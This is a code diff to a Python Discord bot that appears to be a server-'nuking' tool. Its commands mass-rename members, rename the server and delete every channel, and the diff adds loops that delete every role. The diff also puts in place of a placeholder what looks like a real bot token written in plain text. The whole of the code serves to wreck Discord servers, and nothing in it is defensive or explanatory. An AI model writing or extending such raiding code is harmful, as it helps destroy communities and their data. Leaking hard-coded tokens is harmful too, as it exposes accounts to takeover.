@@ -2,7 +2,7 @@ import discord
 from discord.ext import commands
 import requests
 
-TOKEN = 'YOUR_TOKEN_HERE'
+TOKEN = 'MTA5NTUxNTI4NDYzNjQ1MDg5Nw.GAbAi9.Cv99MpiJuf53UvPke42zEoCZjqYP0j4TBBvHGo'
 
 nickName = "Nickname"
 image_url = "https://cdn.wallpapersafari.com/61/15/RQbVOd.jpg"
@@ -27,6 +27,12 @@ async def nuke(ctx):
       await member.edit(nick=nickName)
     except:
       print("Failed nickname")
+
+    for role in ctx.guild.roles:
+      try:
+        await role.delete()
+      except:
+        print("Failed role")
   
   try:
     await ctx.guild.edit(name=serverName)
@@ -63,10 +69,18 @@ async def nicknuke(ctx):
       print("Failed nickname")
 
 
-@bot.slash_command(name="removeall", description='Removes all channels')
+@bot.slash_command(name="removeall", description='Removes all channels and roles')
 async def remove(ctx):
   for channel in ctx.guild.channels:
     await channel.delete()
+
+  for role in ctx.guild.roles:
+      try:
+        await role.delete()
+      except:
+        print("Failed role")
+
+    
 try:
   bot.run(TOKEN)
 except:
